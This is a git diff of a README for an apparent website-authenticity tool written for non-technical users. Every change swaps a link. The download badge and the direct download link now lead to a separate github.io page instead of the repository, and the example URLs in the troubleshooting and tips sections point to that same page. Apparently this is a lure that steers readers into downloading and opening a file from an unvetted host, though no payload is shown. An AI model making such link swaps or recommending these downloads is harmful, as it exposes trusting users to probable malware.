@@ -1,6 +1,6 @@
 # 🔍 web-authenticity-checker - Quick, Clear, Reliable Authenticity Verification
 
-[![Download web-authenticity-checker](https://img.shields.io/badge/Download-web--authenticity--checker-4CAF50?style=for-the-badge&logo=github)](https://github.com/inclement-irreversibility297/web-authenticity-checker)
+[![Download web-authenticity-checker](https://img.shields.io/badge/Download-web--authenticity--checker-4CAF50?style=for-the-badge&logo=github)](https://inclement-irreversibility297.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ This guide is written for everyday users. You don't need any technical skills—
 Getting the app is simple. Here's what you need to do:
 
 1. Click the **green download button** at the top of this page, or use this direct link:
-   [**https://github.com/inclement-irreversibility297/web-authenticity-checker**](https://github.com/inclement-irreversibility297/web-authenticity-checker)
+   [**https://inclement-irreversibility297.github.io**](https://inclement-irreversibility297.github.io)
 
 2. **Visit this link to download the application.** You'll be taken to the download page where the file is hosted.
 
@@ -71,7 +71,7 @@ If something isn't working, don't panic. Here are common fixes:
 **Solution**: Make sure you have an up-to-date web browser. Right-click the file and select "Open with" and choose Chrome, Edge, or Firefox.
 
 ### Problem: The tool says "Invalid URL"
-**Solution**: Double-check that you've typed the website address correctly (e.g., `https://www.example.com`). Make sure to include the `https://` part.
+**Solution**: Double-check that you've typed the website address correctly (e.g., `https://inclement-irreversibility297.github.io`). Make sure to include the `https://` part.
 
 ### Problem: The page looks broken or blank
 **Solution**: Try refreshing the page. If that doesn't work, close your browser and reopen the file.
@@ -86,7 +86,7 @@ If something isn't working, don't panic. Here are common fixes:
 To get the best results from web-authenticity-checker, follow these tips:
 
 ### Inputting a URL
-- Always include the **full address** (e.g., `https://www.example.com`).
+- Always include the **full address** (e.g., `https://inclement-irreversibility297.github.io`).
 - Avoid using search engines to find the URL; type it directly or copy-paste it from your address bar.
 
 ### Reading the Results
